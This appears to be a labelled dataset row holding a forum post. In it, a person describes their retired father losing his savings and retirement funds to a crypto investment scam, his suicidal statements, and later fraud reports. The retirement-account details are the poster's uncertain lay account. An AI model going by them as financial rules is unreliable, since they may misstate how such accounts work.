My dad (already past retirement age and retired) had received a message from a close friend in a social media platform for an investment opportunity in cryptocurrency, promising high returns. The website starts with ppl letters Led***. This was a trusted friend so he clicked on the link (not sure if the friend was hacked or was created under a false account). I don't know the details of what happened after that but supposedly they convinced my dad to put all of his savings account money into this crypto scheme in $50k increments. They sent him ""proof"" that his money was growing, at a 300% rate or something, and convinced him to put more money in. That's when he ""borrowed"" money from his 401k, withdrawing hundreds of thousands, again in $50k increments until his 401k investment bank flagged it as suspicious and refused to allow him to withdraw his remaining $10k that's left in there. That's when my dad realized that he had been scammed and proceeded to close all of his bank accounts (not that there's anything left).

The Led*** company then realized he had stopped putting more money in and proceeded to threaten to sue him and take his house away. 

The 401k company is also now demanding that he pay up within 2 months for the money that he had borrowed from the 401k or suffer additional fines at a high interest rate. 

My dad's beside himself as he has no money to be able to pay it all back as he's retired and is now saying he wants to commit suicide. This his and my mom's entire life and retirement savings that they've been saving for the past 50 years. 

I don't know what to do. Have there been any stories of people being able to recoup these losses back? Can 401k companies demand that you pay back the borrowed money within 2 months? Isn't your 401k money yours to withdraw after age 59.5? Is the 401k company scamming him, too??

Appreciate all the feedback in advance. Thank you!!

Edit:

Thank you all so, so, so much for all the feedback and kind words. I wanted to provide an update after calling my dad this evening. I preface this to say that my dad never gives me the full info, only in bits and pieces that I feel like I have to squeeze out. 

Turns out, it wasn't his 401k. He had consolidated all of his 401k accounts into an IRA account and borrowed against that. That is why they are demanding that he return a portion of the money (he's taking part of the distribution as a hit and as part of his income for the year). If he chooses to take the entirety of it as part of his income, he would not be able to afford the amount of tax that would be due on it.

So I guess that solves that mystery and there is no way out of it. Now I have to figure out if I should take out part of my 401k to help him pay back his IRA...

Also, we have already filed police reports and FTC fraud report. Will get on the FBI report tomorrow. 

Thank you all again. <3",Phishing,3156,590,70,1
